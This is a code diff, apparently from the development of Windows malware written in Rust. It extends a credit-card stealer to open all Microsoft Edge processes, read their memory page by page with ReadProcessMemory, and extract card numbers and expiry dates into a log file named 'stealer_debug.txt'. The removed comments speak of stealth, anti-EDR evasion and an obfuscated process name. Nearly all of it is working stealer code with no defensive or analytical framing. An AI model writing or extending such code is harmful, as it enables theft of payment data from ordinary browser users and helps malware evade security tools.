@@ -22,26 +22,25 @@ pub struct EdgeProcess {
     pub base_address: usize,
 }
 
-/// Encuentra el proceso de msedge.exe usando técnicas stealth
-pub fn find_edge_process() -> Option<EdgeProcess> {
+/// Encuentra TODOS los procesos msedge.exe (main + renderers + utility)
+pub fn find_all_edge_processes() -> Vec<EdgeProcess> {
+    let mut processes = Vec::new();
+    
     unsafe {
-        // Usar CreateToolhelp32Snapshot en lugar de EnumProcesses (menos sospechoso)
         let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
-            return None;
+            return processes;
         }
 
         let mut entry: PROCESSENTRY32 = mem::zeroed();
         entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;
 
-        // Iterar procesos
         if Process32First(snapshot, &mut entry) == FALSE {
             CloseHandle(snapshot);
-            return None;
+            return processes;
         }
 
         loop {
-            // Convertir nombre de proceso a string
             let process_name = String::from_utf8_lossy(
                 &entry.szExeFile.iter()
                     .take_while(|&&c| c != 0)
@@ -49,14 +48,9 @@ pub fn find_edge_process() -> Option<EdgeProcess> {
                     .collect::<Vec<u8>>()
             ).to_lowercase();
 
-            // Buscar msedge.exe (ofuscado)
             if process_name == obfstr!("msedge.exe") {
                 let pid = entry.th32ProcessID;
                 
-                // Abrir handle con todos los permisos necesarios
-                // PROCESS_VM_READ (0x0010) - Leer memoria
-                // PROCESS_QUERY_INFORMATION (0x0400) - Query info
-                // PROCESS_VM_OPERATION (0x0008) - Operaciones de memoria
                 let handle = OpenProcess(
                     0x0010 | 0x0400 | 0x0008,  // VM_READ | QUERY_INFORMATION | VM_OPERATION
                     FALSE,
@@ -64,12 +58,10 @@ pub fn find_edge_process() -> Option<EdgeProcess> {
                 );
 
                 if !handle.is_null() {
-                    CloseHandle(snapshot);
-                    
-                    return Some(EdgeProcess {
+                    processes.push(EdgeProcess {
                         pid,
                         handle,
-                        base_address: 0, // Se calculará después
+                        base_address: 0,
                     });
                 }
             }
@@ -80,12 +72,152 @@ pub fn find_edge_process() -> Option<EdgeProcess> {
         }
 
         CloseHandle(snapshot);
-        None
     }
+    
+    processes
 }
 
-/// Escanea memoria del proceso Edge buscando patrones de tarjetas
-/// Usa técnicas anti-EDR para no ser detectado
+/// Encuentra el primer proceso de msedge.exe (backward compatibility)
+pub fn find_edge_process() -> Option<EdgeProcess> {
+    find_all_edge_processes().into_iter().next()
+}
+
+/// Escanea TODOS los procesos Edge buscando tarjetas (función principal)
+pub fn scan_all_edge_processes_for_cards() -> Vec<CreditCardData> {
+    use std::io::Write;
+    
+    let debug_path = std::env::temp_dir().join("stealer_debug.txt");
+    let mut debug_file = std::fs::OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(&debug_path)
+        .ok();
+    
+    let mut log = |msg: &str| {
+        if let Some(ref mut file) = debug_file {
+            let _ = writeln!(file, "{}", msg);
+        }
+    };
+    
+    let mut all_cards = Vec::new();
+    let processes = find_all_edge_processes();
+    
+    log(&format!("🔍 [MULTI-PROCESS SCAN] Encontrados {} procesos msedge.exe", processes.len()));
+    
+    for (idx, process) in processes.iter().enumerate() {
+        log(&format!("  📍 Escaneando proceso #{} - PID: {}", idx + 1, process.pid));
+        
+        let cards = scan_edge_memory_for_cards_internal(process, &mut log);
+        
+        if !cards.is_empty() {
+            log(&format!("    ✅ Encontradas {} tarjetas en PID {}", cards.len(), process.pid));
+            all_cards.extend(cards);
+        } else {
+            log(&format!("    ⏭️  Sin tarjetas en PID {}", process.pid));
+        }
+    }
+    
+    log(&format!("🎯 [MULTI-PROCESS SCAN] Total: {} tarjetas encontradas en {} procesos", 
+        all_cards.len(), processes.len()));
+    
+    all_cards
+}
+
+/// Escanea memoria de UN proceso Edge (función interna más silenciosa)
+fn scan_edge_memory_for_cards_internal<F>(edge: &EdgeProcess, log: &mut F) -> Vec<CreditCardData>
+where
+    F: FnMut(&str),
+{
+    let mut cards = Vec::new();
+    
+    unsafe {
+        const CHUNK_SIZE: usize = 4096;
+        let mut address: usize = 0x10000;
+        let mut buffer = vec![0u8; CHUNK_SIZE];
+        let mut pages_scanned = 0;
+        let mut pages_readable = 0;
+        let mut regions_checked = 0;
+        let mut regions_valid = 0;
+        
+        while address < 0x7FFF_0000 && regions_checked < 50000 && pages_scanned < 10000 {
+            let mut mbi: MEMORY_BASIC_INFORMATION = mem::zeroed();
+            let query_result = VirtualQueryEx(
+                edge.handle,
+                address as LPVOID,
+                &mut mbi as *mut MEMORY_BASIC_INFORMATION,
+                mem::size_of::<MEMORY_BASIC_INFORMATION>()
+            );
+            
+            regions_checked += 1;
+            
+            if query_result == 0 {
+                address += 0x10000;
+                continue;
+            }
+            
+            let is_readable = (mbi.Protect & PAGE_READONLY != 0) 
+                || (mbi.Protect & PAGE_READWRITE != 0)
+                || (mbi.Protect & PAGE_EXECUTE_READ != 0)
+                || (mbi.Protect & PAGE_EXECUTE_READWRITE != 0);
+            
+            if mbi.State == MEM_COMMIT && is_readable && mbi.RegionSize > 0 {
+                regions_valid += 1;
+                
+                let region_start = address;
+                let region_end = (region_start + mbi.RegionSize as usize).min(0x7FFF_0000);
+                let mut region_addr = region_start;
+                
+                let mut pages_in_region = 0;
+                while region_addr < region_end && pages_scanned < 10000 && pages_in_region < 256 {
+                    let mut bytes_read: usize = 0;
+                    
+                    let result = ReadProcessMemory(
+                        edge.handle,
+                        region_addr as LPVOID,
+                        buffer.as_mut_ptr() as LPVOID,
+                        CHUNK_SIZE,
+                        &mut bytes_read as *mut usize
+                    );
+                    
+                    pages_scanned += 1;
+                    pages_in_region += 1;
+                    
+                    if result != 0 && bytes_read > 0 {
+                        pages_readable += 1;
+                        
+                        if let Some(card) = search_credit_card_pattern(&buffer[..bytes_read]) {
+                            log(&format!("      💳 Card found: {} (exp {}/{})", 
+                                card.card_number,
+                                card.expiry_month.unwrap_or(0),
+                                card.expiry_year.unwrap_or(0)));
+                            cards.push(card);
+                        }
+                    }
+                    
+                    region_addr += CHUNK_SIZE;
+                    
+                    if cards.len() > 50 {
+                        break;
+                    }
+                }
+                
+                address = region_end;
+            } else {
+                let next_address = address.saturating_add(mbi.RegionSize as usize);
+                address = next_address.min(0x7FFF_0000);
+            }
+        }
+        
+        if !cards.is_empty() {
+            log(&format!("      Stats: {} regiones válidas, {} páginas leídas", 
+                regions_valid, pages_readable));
+        }
+    }
+    
+    cards
+}
+
+/// Escanea memoria del proceso Edge buscando patrones de tarjetas (wrapper para compatibilidad)
 pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
     use std::io::Write;
     
